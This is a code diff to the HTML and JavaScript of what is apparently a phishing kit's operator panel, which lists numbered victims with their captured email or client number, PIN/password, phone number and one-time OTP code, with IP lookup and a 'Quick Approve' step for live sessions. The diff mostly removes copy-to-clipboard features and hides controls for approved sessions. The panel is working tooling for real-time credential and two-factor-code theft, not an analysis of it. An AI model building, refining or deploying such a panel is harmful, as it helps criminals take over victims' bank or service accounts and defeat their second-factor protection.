@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>$$$</title>
-  <link rel="preconnect" href="https://rsms.me ">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
+  <link rel="preconnect" href="https://rsms.me">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
     :root {
       --bg: #000000;
@@ -265,6 +265,7 @@
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
     .icon-btn.skip{border-color:rgba(52,211,153,.4);background:rgba(52,211,153,.12)}
     .icon-btn.skip:hover{background:rgba(52,211,153,.22)}
+    .icon-btn.skip img{filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(100deg)}
     
     .cred {
       font-family:monospace;
@@ -275,21 +276,6 @@
       color:var(--cred-color);
       border:1px solid var(--card-border);
       backdrop-filter:blur(4px);
-      cursor:pointer;
-      transition:all .2s ease;
-      user-select:all;
-    }
-    .cred:hover {
-      background:rgba(255,255,255,0.12);
-      border-color:var(--card-border-hover);
-    }
-    .cred.copied {
-      animation:copiedPulse 0.3s ease;
-    }
-    @keyframes copiedPulse {
-      0% { transform:scale(1); }
-      50% { transform:scale(1.05); background:var(--green); color:#000; }
-      100% { transform:scale(1); }
     }
     
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
@@ -335,9 +321,7 @@
     }
     .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500}
     .info-value{font-size:14px;color:var(--text-primary);font-weight:500}
-    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px;cursor:pointer;transition:all .2s;user-select:all}
-    .info-value.mono:hover{background:rgba(128,128,128,0.2)}
-    .info-value.mono.copied{background:var(--green);color:#000}
+    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px}
     .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4}
     
     .full-width{grid-column:1 / -1}
@@ -717,26 +701,6 @@
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
 
-    /* ----------  COPY TO CLIPBOARD  ---------- */
-    async function copyToClipboard(text, element) {
-      try {
-        await navigator.clipboard.writeText(text);
-        // Visual feedback
-        element.classList.add('copied');
-        setTimeout(() => element.classList.remove('copied'), 300);
-      } catch (err) {
-        // Fallback
-        const textarea = document.createElement('textarea');
-        textarea.value = text;
-        document.body.appendChild(textarea);
-        textarea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textarea);
-        element.classList.add('copied');
-        setTimeout(() => element.classList.remove('copied'), 300);
-      }
-    }
-
     /* ----------  THEME  ---------- */
     function loadTheme() {
       const saved = localStorage.getItem('panelTheme') || 'dark';
@@ -816,7 +780,7 @@
       
       // Quick approve button for verify.html with phone entered
       if (s.page === 'verify.html' && s.phone && s.entered) {
-        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check.png"></button>`;
+        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check-square-svgrepo-com.svg"></button>`;
       }
       
       if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
@@ -901,12 +865,12 @@
         const isSelected = selectedSessions.has(s.sid);
         return `
         <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
-          <td class="select-col"><div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div></td>
+          <td class="select-col">${approved ? '' : `<div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div>`}</td>
           <td>${s.victimNum}</td>
-          <td><span class="cred" onclick="copyToClipboard('${s.email||''}', this)">${s.email||'—'}</span></td>
-          <td><span class="cred" onclick="copyToClipboard('${s.password||''}', this)">${s.password||'—'}</span></td>
-          <td><span class="cred" onclick="copyToClipboard('${s.phone||''}', this)">${s.phone||'—'}</span></td>
-          <td><span class="cred" onclick="copyToClipboard('${s.otp||''}', this)">${s.otp||'—'}</span></td>
+          <td><span class="cred">${s.email||'—'}</span></td>
+          <td><span class="cred">${s.password||'—'}</span></td>
+          <td><span class="cred">${s.phone||'—'}</span></td>
+          <td><span class="cred">${s.otp||'—'}</span></td>
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
@@ -930,7 +894,7 @@
     }
 
     function toggleSelectAll() {
-      const allSids = jsonData.sessions.map(s => s.sid);
+      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
       if (selectedSessions.size === allSids.length) {
         selectedSessions.clear();
       } else {
@@ -953,7 +917,7 @@
       batchActions.classList.toggle('active', count > 0);
       
       // Update select all checkbox
-      const allSids = jsonData.sessions.map(s => s.sid);
+      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
       selectAllBox.classList.toggle('checked', count > 0 && count === allSids.length);
       
       // Update individual checkboxes
@@ -983,7 +947,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
@@ -1011,7 +975,7 @@
         <div class="info-grid">
           <div class="info-section">
             <div class="info-label">Session ID</div>
-            <div class="info-value mono" style="font-size:11px" onclick="copyToClipboard('${s.sid}', this)">${s.sid}</div>
+            <div class="info-value mono" style="font-size:11px">${s.sid}</div>
           </div>
           <div class="info-section">
             <div class="info-label">Current Page</div>
@@ -1019,19 +983,19 @@
           </div>
           <div class="info-section">
             <div class="info-label">Client Number</div>
-            <div class="info-value mono" onclick="copyToClipboard('${s.email||''}', this)">${s.email||'—'}</div>
+            <div class="info-value mono">${s.email||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">PIN / Password</div>
-            <div class="info-value mono" onclick="copyToClipboard('${s.password||''}', this)">${s.password||'—'}</div>
+            <div class="info-value mono">${s.password||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">Phone Number</div>
-            <div class="info-value mono" onclick="copyToClipboard('${s.phone||''}', this)">${s.phone||'—'}</div>
+            <div class="info-value mono">${s.phone||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">OTP Code</div>
-            <div class="info-value mono" onclick="copyToClipboard('${s.otp||''}', this)">${s.otp||'—'}</div>
+            <div class="info-value mono">${s.otp||'—'}</div>
           </div>
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
@@ -1059,10 +1023,12 @@
           <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
           <div class="activity-log">${activityHtml}</div>
         </div>
+        ${!approved ? `
         <div class="delete-section">
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
-        </div>`;
+        </div>
+        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
       
       qs('#modal').style.display='flex';
     }
